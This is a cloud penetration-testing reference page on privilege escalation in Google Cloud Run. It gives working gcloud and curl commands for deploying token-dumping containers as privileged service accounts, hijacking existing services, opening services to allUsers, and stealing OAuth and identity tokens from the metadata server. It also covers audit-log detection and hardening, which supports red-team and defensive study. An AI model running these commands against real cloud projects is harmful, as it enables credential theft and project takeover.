---
cstg_id: CSTG-GCP-CLOUD-RUN-PRIVESC
title: "GCP Cloud Run - Privilege Escalation"
provider: gcp
service: cloud-run
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - run.services.create
  - run.services.update
  - run.services.setIamPolicy
  - run.jobs.create
  - run.jobs.run
  - run.routes.invoke
  - iam.serviceAccounts.actAs
  - iam.serviceAccounts.getAccessToken
tools:
  - gcloud CLI
  - Google Cloud REST API (run.googleapis.com)
  - curl / HTTP client
  - container image build tooling
references:
  - "https://cloud.google.com/run/docs/securing/service-identity"
  - "https://cloud.google.com/run/docs/securing/managing-access"
  - "https://cloud.google.com/iam/docs/service-accounts-actas"
  - "https://cloud.google.com/run/docs/configuring/services/service-accounts"
  - "https://cloud.google.com/run/docs/container-contract#metadata-server"
  - "https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/"
  - "https://hackingthe.cloud/gcp/general-knowledge/default-service-accounts/"
license: CC BY-SA 4.0
---

## Summary

Cloud Run privilege escalation turns control over *what runs* into control over *whose identity runs it*. Every Cloud Run service and job executes as a **runtime service account** and exposes that account's OAuth tokens to the running container via the metadata server. A principal who can deploy or modify a service, and who can `actAs` a service account, can therefore run attacker-chosen code as that service account — harvesting its tokens and inheriting all of its IAM permissions. Because the historic default runtime identity is the **Compute Engine default service account with `roles/editor`**, a foothold with even modest Cloud Run permissions frequently escalates to project-editor.

This page enumerates the distinct permissions that enable escalation and the concrete path each one unlocks: deploying a new service that impersonates a privileged SA, updating an existing service to swap in code or a more privileged SA, running a job as a privileged SA, rewriting the invoker policy to make a target endpoint publicly callable, and — from inside a compromised container — stealing the runtime SA token directly from the metadata server. The objective is to obtain credentials or an execution context with greater privilege than the starting identity. Discovery of the relevant services, runtime SAs, and policies is covered in [Cloud Run Enumeration](../02-services/gcp-cloud-run-enum.md).

## Prerequisites

This phase assumes an **assumed-breach** position: either a set of IAM permissions on the Cloud Run / IAM APIs, or code execution inside an existing Cloud Run container. The relevant permissions:

- `run.services.create` / `run.services.update` (in `roles/run.developer`, `roles/run.admin`) — deploy or modify services.
- `run.jobs.create` / `run.jobs.run` — create and execute jobs.
- `run.services.setIamPolicy` — change who may invoke a service.
- `run.routes.invoke` (`roles/run.invoker`) — call a service's endpoint.
- `iam.serviceAccounts.actAs` (in `roles/iam.serviceAccountUser`) — **the pivot permission**: required to attach a service account to a deployment. Without it, the platform rejects the deploy with the chosen SA.
- `iam.serviceAccounts.getAccessToken` / `getOpenIdToken` (`roles/iam.serviceAccountTokenCreator`) — directly mint tokens, an alternative that does not need Cloud Run at all but is in scope when chained with Cloud Run targets.

The escalation requires a **target service account** that is more privileged than the current identity and that the current identity is permitted to `actAs`. Identify candidates from the enumeration phase (default editor SA, SAs holding owner/editor/token-creator/secret-accessor, etc.).

## Enumeration

Confirm the building blocks before attempting a path:

```bash
PROJECT=target-project-id
REGION=us-central1

# 1) Which SAs can I act as? (project + per-SA resource policies)
gcloud projects get-iam-policy "$PROJECT" --format=json \
  | jq '.bindings[] | select(.role|test("iam.serviceAccountUser|iam.serviceAccountTokenCreator|run\\."))'

for SA in $(gcloud iam service-accounts list --project="$PROJECT" --format="value(email)"); do
  gcloud iam service-accounts get-iam-policy "$SA" --format=json \
    | jq --arg sa "$SA" '{sa:$sa, bindings:.bindings}'
done

# 2) What can each candidate target SA do? (rank by privilege)
gcloud projects get-iam-policy "$PROJECT" --format=json \
  | jq '.bindings[] | select(.members[] | test("serviceAccount:"))'

# 3) My own Cloud Run permissions
gcloud iam list-testable-permissions \
  "//run.googleapis.com/projects/$PROJECT/locations/$REGION/services/SVC" 2>/dev/null
```

## Misconfigurations & Findings

- **`iam.serviceAccountUser` granted at project scope** over a privileged SA (especially the default editor SA), combined with any Cloud Run deploy permission — the classic deploy-to-impersonate primitive.
- **Default runtime service account in use** so that *every* deploy path lands on `roles/editor` even without explicitly choosing an SA.
- **`run.services.setIamPolicy` held broadly**, allowing an attacker to self-grant `run.invoker` or expose a target service to `allUsers`.
- **Over-privileged runtime SAs** (owner/editor/token-creator/secret-accessor/projectIamAdmin), which convert any container code-execution or SSRF into broad compromise.
- **No `iam.automaticIamGrantsForDefaultServiceAccounts` restriction** and no org policy blocking public members, so escalation results (public endpoints, editor tokens) persist.

## Exploitation

### iam.serviceAccounts.actAs

This is the keystone permission. It does not escalate on its own, but combined with a Cloud Run deploy or job-run permission it lets the current identity attach a more privileged service account to attacker-controlled code. The platform enforces `actAs` against the chosen `--service-account` at deploy time; possessing it over a privileged SA is the precondition for every deploy-based path below.

```bash
# Verify actAs over the intended target SA before attempting deploy
gcloud iam service-accounts get-iam-policy \
  TARGET_SA@"$PROJECT".iam.gserviceaccount.com --format=json \
  | jq '.bindings[] | select(.role=="roles/iam.serviceAccountUser"
        or .role=="roles/iam.serviceAccountTokenCreator")'
```

### run.services.create

With `run.services.create` plus `actAs` over a privileged SA, deploy a new service that runs an image you control and exfiltrates the runtime SA token from the metadata server. The image can be a minimal container that, on each request, reads the token and forwards it to an attacker endpoint — or simply prints it to the request log if log access is available.

```bash
TARGET_SA=privileged-sa@"$PROJECT".iam.gserviceaccount.com

# Deploy attacker container as the privileged SA. --no-allow-unauthenticated
# avoids exposing it publicly; you invoke it yourself with run.invoker.
gcloud run deploy exfil-svc \
  --image=REGION-docker.pkg.dev/$PROJECT/REPO/token-dumper:latest \
  --service-account="$TARGET_SA" \
  --region="$REGION" --project="$PROJECT" \
  --no-allow-unauthenticated

# Invoke it with your own identity token to trigger token capture
URL=$(gcloud run services describe exfil-svc --region="$REGION" \
  --project="$PROJECT" --format="value(status.url)")
curl -s -H "Authorization: Bearer $(gcloud auth print-identity-token)" "$URL/"
```

Inside the container, the runtime SA's access token is fetched from the metadata server:

```bash
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# Returns an OAuth2 access token for TARGET_SA with cloud-platform scope.
```

That token is then used off-host as the privileged SA:

```bash
ACCESS_TOKEN=<captured>
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT/getIamPolicy" -X POST
# If TARGET_SA is editor/owner, you now operate with that privilege.
```

If no custom registry is available, the same effect is achievable with a stock image plus an inline startup that echoes the token, or by using a job (below). A common one-shot variant is a container whose entrypoint curls the metadata token endpoint and posts it outbound.

### run.services.update

If a privileged service already exists, `run.services.update` lets you modify it in place — point it at an attacker image, add an exfiltration sidecar/env, or **change its runtime service account to a more privileged one** (still gated by `actAs` over the new SA). Updating an existing service can be stealthier than creating one and may inherit existing ingress/invoker settings.

```bash
# Swap the running image while keeping (or escalating) the runtime SA
gcloud run services update target-svc \
  --image=REGION-docker.pkg.dev/$PROJECT/REPO/token-dumper:latest \
  --region="$REGION" --project="$PROJECT"

# Or point an existing service at a more privileged SA you can actAs
gcloud run services update target-svc \
  --service-account="$TARGET_SA" \
  --region="$REGION" --project="$PROJECT"
```

### run.jobs.create

Cloud Run **jobs** run a container to completion as a runtime SA, with no public endpoint required. With `run.jobs.create`/`run.jobs.run` plus `actAs`, create a job whose container mints and exfiltrates the SA token, then execute it. This avoids needing `run.invoker` or any ingress.

```bash
gcloud run jobs create exfil-job \
  --image=REGION-docker.pkg.dev/$PROJECT/REPO/token-dumper:latest \
  --service-account="$TARGET_SA" \
  --region="$REGION" --project="$PROJECT"

gcloud run jobs execute exfil-job --region="$REGION" --project="$PROJECT" --wait
# The job's container reads the metadata token and ships it outbound.
```

### run.services.setIamPolicy

`run.services.setIamPolicy` controls who may *invoke* a service. An attacker can use it to make a target service publicly callable (bind `roles/run.invoker` to `allUsers`) or to grant themselves invoke rights — useful when the service performs privileged actions in-app, or to reach a private service deployed in the previous paths without separate `run.invoker`.

```bash
gcloud run services add-iam-policy-binding target-svc \
  --member="allUsers" --role="roles/run.invoker" \
  --region="$REGION" --project="$PROJECT"

# Or self-grant
gcloud run services add-iam-policy-binding target-svc \
  --member="user:attacker@example.com" --role="roles/run.invoker" \
  --region="$REGION" --project="$PROJECT"
```

### run.routes.invoke (in-container metadata theft)

If the starting position is **code execution inside an existing Cloud Run container** (via app RCE, SSRF, or a deserialization bug), no IAM write permission is needed — the runtime SA token is directly readable from the metadata server, and the privilege gained is exactly that SA's. This is the most common real-world Cloud Run escalation: a web bug in a public service whose runtime SA is over-privileged.

```bash
# From inside the container (or via SSRF that can reach metadata.google.internal)
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Identity token (for calling other run.invoker-protected services)
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://other-svc.a.run.app"
```

With the access token, enumerate and act as the SA off-host, then re-enter the escalation graph: if the SA holds `iam.serviceAccounts.getAccessToken` over a *higher* SA, chain impersonation; if it holds `secretmanager.secretAccessor`, dump secrets; if it holds editor/owner, the project is compromised. SSRF reaching the metadata endpoint is functionally equivalent to in-container execution for token theft.

### iam.serviceAccounts.getAccessToken

When the current identity (or a captured runtime SA) holds `roles/iam.serviceAccountTokenCreator` over a more privileged SA, escalation needs no deploy at all — mint the target's token directly and combine it with Cloud Run targets:

```bash
gcloud auth print-access-token \
  --impersonate-service-account="$TARGET_SA"

# Use the impersonated token to deploy/run as an even higher SA, repeating the chain
```

## Detection & Logging

- **Cloud Audit Logs — Admin Activity** record the escalation actions: `google.cloud.run.v2.Services.CreateService` / `UpdateService`, `google.cloud.run.v2.Jobs.CreateJob` / `RunJob`, and `SetIamPolicy` on Cloud Run services. The `authenticationInfo.principalEmail` shows the deploying principal and the `serviceAccountName` in the request reveals the runtime SA being attached — a new/updated service running as the default editor SA or another high-privilege SA is a strong signal.
- **`actAs` usage** appears as a `serviceAccountDelegationInfo` / `authorizationInfo` entry referencing `iam.serviceAccounts.actAs` on the target SA within the deploy log entry.
- **Token minting** via `getAccessToken`/`getOpenIdToken`/`signJwt` is logged under `iam.googleapis.com` when Data Access logs are enabled; correlate with subsequent anomalous calls by the impersonated SA.
- **Metadata-server token retrieval inside a container is not logged**; detect the escalation by its downstream effect — the runtime SA suddenly calling APIs it never used before, from new locations, shortly after a deploy or after suspicious request-log entries on a public service.
- **`SetIamPolicy` adding `allUsers`/`allAuthenticatedUsers` as `run.invoker`** is a high-fidelity public-exposure alert.
- **Security Command Center** flags public Cloud Run services, default/over-privileged runtime SAs, and anomalous IAM grants that result from these paths.

## Remediation & Hardening

- Separate deploy rights from impersonation rights: grant `roles/run.developer` without project-wide `roles/iam.serviceAccountUser`; scope `actAs` to a single least-privilege runtime SA per service.
- Never run services as the default Compute Engine SA; disable automatic editor grants (`iam.automaticIamGrantsForDefaultServiceAccounts`) and assign dedicated least-privilege runtime SAs.
- Tightly restrict `roles/iam.serviceAccountTokenCreator` and `roles/iam.serviceAccountUser`; audit every binding over privileged SAs.
- Enforce `iam.allowedPolicyMemberDomains` to block `allUsers`/`allAuthenticatedUsers` so `setIamPolicy`-based public exposure fails.
- Use Binary Authorization / restricted Artifact Registry so only vetted images can be deployed, blunting attacker-image paths.
- Harden in-app code against SSRF and RCE; where feasible, block container egress to `metadata.google.internal` for paths that do not need it, and use the metadata server's `GCE_METADATA_HOST` controls / VPC egress restrictions to limit exfiltration.
- Enable Data Access audit logs for Cloud Run, IAM, and Secret Manager, and alert on new services/jobs running as privileged SAs and on `run.invoker` grants to public members.

## Tools

- **gcloud CLI** — `gcloud run deploy/services update/jobs create/jobs execute`, `add-iam-policy-binding`, `--impersonate-service-account`.
- **Google Cloud REST API** — `run.googleapis.com` deploy/update/setIamPolicy methods; `iam.googleapis.com` `generateAccessToken`/`generateIdToken`.
- **curl / HTTP client** — metadata-server token retrieval from a foothold and invoking deployed services.
- **Container image build tooling** — produce the minimal token-exfiltration image used in deploy/job paths.

## References

- Cloud Run service identity — https://cloud.google.com/run/docs/securing/service-identity
- Configuring the runtime service account — https://cloud.google.com/run/docs/configuring/services/service-accounts
- Managing invoker access — https://cloud.google.com/run/docs/securing/managing-access
- Service account impersonation / `actAs` — https://cloud.google.com/iam/docs/service-accounts-actas
- Container runtime contract (metadata server) — https://cloud.google.com/run/docs/container-contract#metadata-server
- GCP privilege escalation paths (Rhino Security Labs) — https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
- Default service accounts (hackingthe.cloud) — https://hackingthe.cloud/gcp/general-knowledge/default-service-accounts/
